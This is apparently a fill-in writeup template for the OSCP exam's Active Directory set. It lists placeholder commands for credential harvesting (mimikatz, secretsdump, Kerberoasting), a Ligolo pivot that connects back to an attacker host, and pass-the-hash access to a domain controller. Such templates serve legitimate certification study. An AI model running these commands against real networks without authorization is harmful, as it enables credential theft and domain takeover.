# OSCP Exam AD Set - Writeup Template

## Network Overview

- **Domain:** [domain.name]
- **Domain Controller:** DC01 ([IP])
- **Member Servers:** MS01 ([IP]), MS02 ([IP])
- **Initial Credentials (if provided):** [username]:[password]
- **Points:** 40 total (+10 MS01, +10 MS02, +20 DC01)

---

## Quick Reference Tables

### Open Ports Summary

#### MS01 ([External IP] / [Internal IP])

| Port | Service | Version/Details |
|------|---------|----------------|
|      |         |                |

**Hostname:**  
**Notes:**

#### MS02 ([Internal IP])

| Port | Service | Version/Details |
|------|---------|----------------|
|      |         |                |

**Hostname:**  
**Domain:**

#### DC01 ([Internal IP])

| Port | Service | Version/Details |
|------|---------|----------------|
| 53   | DNS     |                |
| 88   | Kerberos|                |
| 135  | RPC     |                |
| 139  | NetBIOS |                |
| 389  | LDAP    |                |
| 445  | SMB     |                |
| 5985 | WinRM   |                |

**Hostname:**  
**Domain:**  
**OS:**

---

### Compromised Credentials Summary

| Username | Password/Hash | Source | Access Level | Target |
|----------|---------------|--------|--------------|--------|
|          |               |        |              |        |

---

## Attack Chain Visualization

```
[MS01: IP]
    │
    ├─► [Initial Access Method]
    │   └─► [Details]
    │
    ├─► [Privilege Escalation]
    │   └─► [Method/Tool]
    │
    └─► [Credential Harvesting]
        ├─► [Method 1]: [Results]
        ├─► [Method 2]: [Results]
        └─► [Method 3]: [Results]
            │
            ▼
[MS02: IP]
    │
    ├─► [Lateral Movement Method]
    │   └─► [Access Details]
    │
    ├─► [Discovery/Enumeration]
    │   └─► [Key Findings]
    │
    └─► [Hash Extraction]
        └─► [Critical Account]: [Hash]
            │
            ▼
[DC01: IP]
    │
    ├─► [Pass-the-Hash/Attack Method]
    │
    ├─► [Domain Admin Access]
    │
    └─► ★ COMPLETE DOMAIN COMPROMISE ★
```

---

## Phase 1: Initial Access - MS01

### 1.1 Reconnaissance

**Target:** [IP] (MS01)

**Nmap Scan:**
```bash
# Initial fast scan
sudo nmap -Pn -sS -p- --min-rate 10000 [IP]

# Detailed service scan
sudo nmap -sC -sV -p [ports] [IP]
```

**Key Findings:**
- 
- 
- 

### 1.2 Service Enumeration

#### Web Application (if applicable)
```bash
# Directory enumeration
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://[IP]:[PORT]/FUZZ -mc 200,204,301,302,307,401
```

**Discovered:**
- 
- 

#### SMB Enumeration (if applicable)
```bash
nxc smb [IP] -u '' -p '' --shares
nxc smb [IP] -u 'guest' -p '' --shares
```

### 1.3 Exploitation

**Vulnerability Identified:**  
**CVE/Reference:**

**Exploitation Steps:**

1. **[Step 1]:**
```bash
[command]
```

2. **[Step 2]:**
```bash
[command]
```

**Result:** [Description of access gained]

### 1.4 Privilege Escalation

**Method:**  
**Tool/Technique:**

**Steps:**
```bash
# Transfer exploit
[transfer command]

# Execute
[execution command]
```

**Result:** [New privilege level]

### 1.5 Credential Harvesting

#### Mimikatz
```powershell
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**Credentials Found:**
| Username | NTLM Hash | Plaintext |
|----------|-----------|-----------|
|          |           |           |

#### Secretsdump
```bash
impacket-secretsdump [user]@[IP] -hashes :[hash]
```

**LSA Secrets:**
- 

#### Kerberoasting
```bash
impacket-GetUserSPNs [domain]/[user]:'[pass]' -dc-ip [DC_IP] -request
```

**Service Accounts:**
| Account | SPN | Hash | Cracked Password |
|---------|-----|------|------------------|
|         |     |      |                  |

#### Other Methods
- **PowerShell History:**
```powershell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- **Hardcoded Credentials:**
```bash
strings [binary] | grep -i password
```

- **Database Files:**
```bash
# Location:
# Contents:
```

---

## Phase 2: Lateral Movement - MS02

### 2.1 Network Pivot Setup (if needed)

**Ligolo Setup:**
```bash
# Attacker machine
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Add route
sudo ip route add [internal_subnet] dev ligolo

# On MS01 (upload agent)
./agent -connect [attacker_ip]:[port] -ignore-cert
```

### 2.2 Target Reconnaissance

**Target:** [Internal IP] (MS02)

```bash
nmap -Pn [IP]
```

**Key Findings:**
- 
- 

### 2.3 Lateral Movement

**Method:** [Pass-the-Hash / Password / Other]

**Credential Used:**
- Username: 
- Password/Hash: 

**Access Command:**
```bash
evil-winrm -i [IP] -u [user] -p '[pass]'
# OR
evil-winrm -i [IP] -u [user] -H "[hash]"
```

**Result:** [Access level achieved]

### 2.4 Privilege Escalation (if needed)

**Method:**  

**Steps:**
```bash
[commands]
```

### 2.5 Critical Discovery

**Finding:** [Description of key discovery]

**Location:**
```powershell
# Path:
# Files:
```

**Exploitation:**
```powershell
# Download critical files
download [file1]
download [file2]
```

### 2.6 Hash Extraction

```bash
# Offline extraction
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Extracted Accounts:**
| Username | RID | NTLM Hash | Notes |
|----------|-----|-----------|-------|
|          |     |           |       |

**High-Value Target Identified:**
- Account: 
- Hash: 
- Reason: 

---

## Phase 3: Domain Compromise - DC01

### 3.1 Target Information

**Target:** [IP] (DC01)  
**Role:** Active Directory Domain Controller  
**Domain:** [domain.name]  
**OS:** [OS Version]

### 3.2 Attack Strategy

**Hypothesis:**  
[Explain why you're targeting this account/method]

### 3.3 Attack Execution

**Method:** Pass-the-Hash

**Validation:**
```bash
netexec winrm [DC_IP] -u [user] -H [hash]
```

**Result:** [Pwn3d! / Failed]

### 3.4 Domain Admin Access

**Session Establishment:**
```bash
evil-winrm -i [DC_IP] -u [user] -H "[hash]"
```

**Privilege Verification:**
```powershell
whoami
whoami /groups
```

**Confirmation:**
- Account: 
- Group Membership: 
- Access Level: 

---

## Proof of Compromise

### MS01 Local Admin
**Flag Location:** `C:\Users\Administrator\Desktop\local.txt`  
**Flag:** `[flag_value]`

### MS02 Local Admin
**Flag Location:** `C:\Users\Administrator\Desktop\local.txt`  
**Flag:** `[flag_value]`

### DC01 Domain Admin
**Flag Location:** `C:\Users\Administrator\Desktop\proof.txt`  
**Flag:** `[flag_value]`

---

## Key Vulnerabilities Summary

### MS01 Vulnerabilities
1. **[Vulnerability Name]**
   - Description: 
   - Impact: 
   - Exploitation: 

2. **[Vulnerability Name]**
   - Description: 
   - Impact: 
   - Exploitation: 

### MS02 Vulnerabilities
1. **[Vulnerability Name]**
   - Description: 
   - Impact: 
   - Exploitation: 

### Domain-Level Vulnerabilities
1. **Password Reuse**
   - Description: 
   - Impact: 
   - Recommendation: 

2. **Insufficient Segmentation**
   - Description: 
   - Impact: 
   - Recommendation: 

---

## Attack Chain Summary

```
Initial Access ([method])
    ↓
Privilege Escalation ([method])
    ↓
Credential Harvesting ([accounts found])
    ↓
Lateral Movement to MS02 ([method])
    ↓
Hash Extraction ([critical account])
    ↓
Domain Compromise ([method])
    ↓
Domain Admin Access (DC01)
```

---

## Points Achieved

- ✓ MS01 Local Admin: +10 points
- ✓ MS02 Local Admin: +10 points  
- ✓ DC01 Domain Admin: +20 points
- **Total: 40/40 points**

---